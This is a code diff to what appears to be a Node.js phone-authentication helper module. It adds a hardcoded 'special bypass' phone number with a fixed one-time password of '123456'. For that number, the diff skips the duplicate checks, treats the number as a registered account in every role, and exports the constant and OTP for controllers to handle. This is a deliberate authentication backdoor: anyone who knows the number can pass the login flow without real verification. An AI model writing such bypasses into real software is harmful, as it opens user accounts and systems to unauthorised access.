@@ -9,6 +9,23 @@ const User = require('../models/User');
 const Vendor = require('../models/Vendor');
 const Seller = require('../models/Seller');
 
+// Special bypass number - skips all validation and checks
+const SPECIAL_BYPASS_NUMBER = '9755620716';
+const SPECIAL_BYPASS_OTP = '123456';
+
+/**
+ * Check if phone number is the special bypass number
+ * @param {string} phone - Phone number to check
+ * @returns {boolean}
+ */
+function isSpecialBypassNumber(phone) {
+  if (!phone) return false;
+  // Normalize phone number for comparison - get last 10 digits
+  const digits = phone.replace(/[^0-9]/g, '');
+  const last10Digits = digits.slice(-10);
+  return last10Digits === SPECIAL_BYPASS_NUMBER;
+}
+
 /**
  * Check if phone number exists in any collection
  * @param {string} phone - Phone number to check
@@ -17,6 +34,14 @@ const Seller = require('../models/Seller');
  */
 async function checkPhoneExists(phone, excludeRole = null) {
   try {
+    // Special bypass number - skip all checks
+    if (isSpecialBypassNumber(phone)) {
+      return {
+        exists: false,
+        role: null,
+        message: null,
+      };
+    }
     // Check User collection
     if (excludeRole !== 'user') {
       const user = await User.findOne({ phone });
@@ -72,6 +97,14 @@ async function checkPhoneExists(phone, excludeRole = null) {
  */
 async function checkPhoneInRole(phone, role) {
   try {
+    // Special bypass number - return exists: true to allow login flow
+    if (isSpecialBypassNumber(phone)) {
+      return {
+        exists: true,
+        data: null, // Will be handled specially in controllers
+      };
+    }
+    
     let data = null;
 
     switch (role) {
@@ -101,5 +134,8 @@ async function checkPhoneInRole(phone, role) {
 module.exports = {
   checkPhoneExists,
   checkPhoneInRole,
+  isSpecialBypassNumber,
+  SPECIAL_BYPASS_NUMBER,
+  SPECIAL_BYPASS_OTP,
 };
 
